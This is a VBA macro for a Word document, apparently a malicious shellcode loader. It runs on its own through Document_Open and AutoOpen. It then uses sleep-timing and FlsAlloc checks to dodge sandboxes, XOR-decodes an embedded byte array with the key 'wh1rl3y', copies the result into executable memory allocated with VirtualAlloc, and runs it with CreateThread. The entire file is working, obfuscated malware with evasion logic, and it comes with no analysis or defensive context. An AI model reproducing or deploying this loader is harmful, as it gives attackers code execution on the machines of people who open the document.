Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long
Function Runner()
	Dim t1 As Date
	Dim t2 As Date
	Dim time As Long
	Dim buf As Variant
	Dim addr As LongPtr
	Dim counter As Long
	Dim data As Long
	Dim res As Long
	Dim en_key As String
	Dim pos As Long
	Dim tmp As LongPtr
	t1 = Now()
	Sleep (2000)
	t2 = Now()
	time = DateDiff("s", t1, t2)
	If time < 2 Then
		Exit Function
	End If
	If isNull(FlsAlloc(tmp)) Then
		Exit Function
	End If
	buf = Array(139,32,178,150,156,219,181,119,104,49,51,61,114,41,37,57,103,58,93 _
        225,28,63,227,99,18,36,184,43,111,32,186,32,76,126,72,190,32,62,197,38 _
        121,49,252,26,97,58,93,243,213,75,9,77,112,64,19,56,182,161,60,51,109 _
        242,155,154,58,112,35,36,184,43,87,227,115,78,36,50,169,17,233,73,106 _
        103,49,118,242,26,49,114,108,184,249,255,104,49,114,36,182,185,3,15,121 _
        115,188,119,242,55,72,120,115,188,99,242,63,112,210,36,36,204,176,58,89 _
        248,51,231,7,241,63,105,231,58,93,243,213,54,169,248,127,45,50,184,79 _
        136,68,131,32,48,53,83,96,116,75,189,70,161,47,44,186,50,72,122,120,167 _
        14,112,249,96,123,61,252,40,45,59,109,227,56,252,108,185,51,52,114,33 _
        63,105,225,44,53,105,56,47,41,104,51,54,123,250,155,72,112,32,147,211 _
        33,54,49,107,58,231,33,144,60,151,206,141,49,122,199,0,27,3,45,95,1,121 _
        119,41,103,59,229,213,49,246,132,145,115,108,51,48,254,141,120,206,110 _
        51,120,204,98,59,120,102,114,45,62,225,213,62,229,194,56,205,36,70,84 _
        107,204,172,59,225,219,26,109,50,121,119,49,112,200,69,179,18,119,151 _
        228,24,102,114,39,39,56,124,67,165,126,72,183,32,206,178,36,186,187,63 _
        151,241,58,229,242,56,205,130,62,173,140,204,172,63,225,246,24,124,114 _
        33,59,225,211,58,229,202,56,205,241,148,6,13,204,172,242,168,69,120,37 _
        204,183,2,141,217,225,108,51,121,63,235,221,98,36,186,155,58,89,248,24 _
        104,114,33,63,225,200,51,214,49,160,191,55,206,167,239,203,121,9,61,121 _
        241,168,19,39,254,158,91,50,45,106,17,119,120,49,114,45,107,49,254,154 _
        121,67,165,114,195,47,204,98,151,147,230,49,254,171,120,251,171,126,72 _
        190,33,184,130,36,186,163,63,225,200,51,214,49,160,191,55,206,167,239 _
        203,121,10,64,105,51,59,106,17,119,40,49,114,45,107,19,119,50,112,200 _
        103,28,118,71,151,228,37,53,114,195,2,6,124,19,147,230,48,136,166,216 _
        78,147,204,134,63,105,242,58,69,245,49,242,158,68,198,45,204,158,47,2 _
        49,43,37,244,187,135,221,147,36,147,230)
	en_key = "wh1rl3y"
	For counter = LBound(buf) To UBound(buf)
		pos = counter Mod Len(en_key)
		buf(counter) = buf(counter) Xor Asc(Left(Mid(en_key, pos + 1), 1))
	Next counter
	addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
	For counter = LBound(buf) To UBound(buf)
		data = buf(counter)
		res = RtlMoveMemory(addr + counter, data, 1)
	Next counter
	res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
Sub Document_Open()
	Runner
End Sub
Sub AutoOpen()
	Runner
End Sub